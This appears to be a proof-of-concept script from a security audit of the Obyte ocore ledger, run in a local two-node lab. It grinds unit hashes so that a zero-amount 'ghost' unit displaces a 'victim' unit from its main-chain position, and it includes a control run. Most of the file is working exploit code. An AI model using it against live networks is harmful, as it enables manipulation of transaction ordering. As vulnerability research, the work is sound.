// E3-3 — F3 DISPLACEMENT EMPIRICAL (two-node lab) — v2
// Core claim (E1-2): the MC-position contest between two 'good' sibling units is reliably
// attacker-winnable via unit-hash grinding (ORDER BY witnessed_level DESC, level-witnessed_level
// ASC, unit ASC — main_chain.js:43-88). The lower-hash unit takes the MC position; the other's
// main_chain_index resets to NULL (goDown).
// v2: non-conflicting siblings (different fee inputs) so BOTH stay 'good' — faithfully matching
// the F3 post-dodge state (IR-F3 already proved the two-'good'-same-proof coexistence; this tests
// the displacement mechanics on top).
// ROLE=node PORT=6612 : listener, dumps final state
// ROLE=hub  PORT=6611 : poster — setup waypoints, then C + grind A, relays, control phase
"use strict";
const path = require("path");
const WebSocket = require("/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore/node_modules/ws");
const { boot, keys, defOf, sleep } = require("./e17b-boot.js");

const ROLE = process.env.ROLE || "hub";
const PORT = parseInt(process.env.PORT || (ROLE === "hub" ? 6611 : 6612), 10);
const NODE_PORT = parseInt(process.env.NODE_PORT || 6612, 10);
const DATA = path.join(__dirname, ".e33-" + ROLE);

function dumpState(ctx, tag) {
	return ctx.query("SELECT unit, level, main_chain_index, is_stable, sequence, is_on_main_chain, witnessed_level FROM units ORDER BY main_chain_index").then(rows => {
		console.log("[" + tag + "] UNITS:", JSON.stringify(rows.map(r => ({
			u: r.unit.slice(0, 8), mci: r.main_chain_index, lvl: r.level, st: r.is_stable,
			seq: r.sequence, omc: r.is_on_main_chain, wl: r.witnessed_level,
		}))));
		return ctx.query("SELECT COUNT(*) AS c FROM balls").then(b => {
			console.log("[" + tag + "] BALLS:", b[0].c);
			return rows;
		});
	});
}

function openRelayClient(url) {
	return new Promise((resolve, reject) => {
		const ws = new WebSocket(url, { maxPayload: 6 * 1024 * 1024 });
		const timer = setTimeout(() => reject(new Error("ws connect timeout to " + url)), 8000);
		ws.on("error", (e) => { clearTimeout(timer); reject(new Error("ws error: " + e)); });
		ws.on("open", () => {
			clearTimeout(timer);
			ws.send(JSON.stringify(["justsaying", { subject: "version", body: {
				protocol_version: "4.0", alt: "1", library: "ocore",
				library_version: "0.4.6", program: "e33-lab", program_version: "0.0.1",
			} }]));
			ws.send(JSON.stringify(["request", { tag: "sub-e33", command: "subscribe", params: {
				subscription_id: "e33-sub", last_mci: 0, library_version: "0.4.6",
			} }]));
			console.log("[hub-ws] handshake sent to", url);
			setTimeout(() => resolve(ws), 800);
		});
	});
}

function sendJoint(ws, joint) {
	if (ws.readyState === 1) {
		ws.send(JSON.stringify(["justsaying", { subject: "joint", body: joint }]));
		return true;
	}
	return false;
}

async function main() {
	const ctx = await boot(DATA, PORT, { bServeAsHub: ROLE === "hub" });
	console.log("[" + ROLE + "] booted port", PORT, "genesis", ctx.genesis.unit.slice(0, 12) + "...");

	if (ROLE === "node") {
		for (let i = 0; i < 75; i++) await sleep(2000);
		await dumpState(ctx, "node-final");
		console.log("NODE-DONE");
		process.exit(0);
	}

	// ============ HUB ============
	await sleep(3000);
	const ws = await openRelayClient("ws://127.0.0.1:" + NODE_PORT);

	// local signer + composer with configurable amount
	const sigLen = ctx.constants.SIG_LENGTH;
	const makeSigner2 = (key) => ({
		readDefinition: (conn, address, cb) => cb(null, defOf(key)),
		readSigningPaths: (conn, address, cb) => cb({ r: sigLen }),
		readPrivateKey: (address, path, cb) => cb(null, Buffer.from(key.priv, "hex")),
	});
	const composeWithAmount = (key, address, label, amount) => new Promise((resolve, reject) => {
		ctx.composer.composeJoint({
			paying_addresses: [address], signing_addresses: [address],
			outputs: amount > 0 ? [{ address, amount }, { address, amount: 0 }] : [{ address, amount: 0 }],
			messages: [{ app: "text", payload_location: "inline", payload: label }],
			signer: makeSigner2(key),
			callbacks: {
				ifOk: (j, p, u) => { u(); resolve(j); },
				ifError: (e) => reject(new Error(label + " compose error: " + JSON.stringify(e).slice(0, 200))),
				ifNotEnoughFunds: (e) => reject(new Error(label + " not enough funds: " + e)),
			},
		});
	});

	// Phase 1 — setup: 4 units (USER, WAYPOINT, USER, WAYPOINT)
	for (let i = 1; i <= 4; i++) {
		const isWitness = (i % 2 === 0);
		const key = isWitness ? keys.witness : keys.user;
		const addr = isWitness ? ctx.witness_addr : ctx.user_addr;
		const label = (isWitness ? "WAYPOINT" : "SETUP") + "-" + i;
		const joint = await ctx.composeUnit(key, addr, label);
		await ctx.validateAndSave(joint, label);
		if (sendJoint(ws, joint)) console.log("[hub] relayed " + label);
		await sleep(700);
	}
	await sleep(4000);
	await dumpState(ctx, "hub-after-setup");

	// Phase 2 — the contest. C = victim (large output, big input), A = ghost (0 amount, small
	// input) — different fee inputs so NO conflict is detected -> both stay 'good'.
	// Both composed BEFORE either is saved -> same parents (tip). Grind A's hash below C's.
	const C = await composeWithAmount(keys.user, ctx.user_addr, "VICTIM-C", 100000);
	const hashC = ctx.objectHash.getUnitHash(C.unit);
	console.log("[hub] C hash:", hashC, "first char '" + hashC[0] + "'");

	let A = null, tries = 0;
	for (let n = 0; n < 40; n++) {
		const cand = await composeWithAmount(keys.user, ctx.user_addr, "GHOST-GRIND-" + n + "-abcdefghijklmnopqrstuvwxyz", 0);
		tries++;
		if (ctx.objectHash.getUnitHash(cand.unit) < hashC) { A = cand; break; }
	}
	if (!A) { console.log("[hub] grind failed in 40 tries"); process.exit(4); }
	const hashA = ctx.objectHash.getUnitHash(A.unit);
	console.log("[hub] A found after " + tries + " tries; A hash:", hashA, "A < C:", hashA < hashC);

	// check the two units use DIFFERENT fee inputs (the both-'good' condition)
	const inputKeyOf = (joint) => JSON.stringify((joint.unit.messages || []).filter(m => m.app === "payment").flatMap(m => (m.payload.inputs || []).map(i => i.unit + "/" + i.message_index + "/" + i.output_index)));
	console.log("[hub] C inputs:", inputKeyOf(C), "| A inputs:", inputKeyOf(A), "| same:", inputKeyOf(C) === inputKeyOf(A));

	await ctx.validateAndSave(C, "C-VICTIM");
	sendJoint(ws, C);
	console.log("[hub] relayed C at", new Date().toISOString());
	await sleep(2000);
	await ctx.validateAndSave(A, "A-GHOST");
	sendJoint(ws, A);
	console.log("[hub] relayed A at", new Date().toISOString());
	await sleep(5000);
	await dumpState(ctx, "hub-contest-final");

	// Phase 3 — control: C2 (large) and A2 (small) where A2 has a HIGHER hash -> C2 keeps position
	const C2 = await composeWithAmount(keys.user, ctx.user_addr, "VICTIM-C2", 100000);
	const hashC2 = ctx.objectHash.getUnitHash(C2.unit);
	let A2 = null, tries2 = 0;
	for (let n = 0; n < 40; n++) {
		const cand = await composeWithAmount(keys.user, ctx.user_addr, "GHOST-HIGH-" + n + "-zyxwvutsrqponmlkjihgfedcba", 0);
		tries2++;
		if (ctx.objectHash.getUnitHash(cand.unit) > hashC2) { A2 = cand; break; }
	}
	if (!A2) { console.log("[hub] control grind failed"); process.exit(5); }
	const hashA2 = ctx.objectHash.getUnitHash(A2.unit);
	console.log("[hub] control: A2 hash > C2 hash:", hashA2 > hashC2);
	await ctx.validateAndSave(C2, "C2");
	sendJoint(ws, C2);
	await sleep(2000);
	await ctx.validateAndSave(A2, "A2");
	sendJoint(ws, A2);
	await sleep(5000);
	await dumpState(ctx, "hub-control-final");

	console.log("HUB-DONE");
	process.exit(0);
}

main().catch(e => { console.error(ROLE + "-ERR:", e); process.exit(2); });
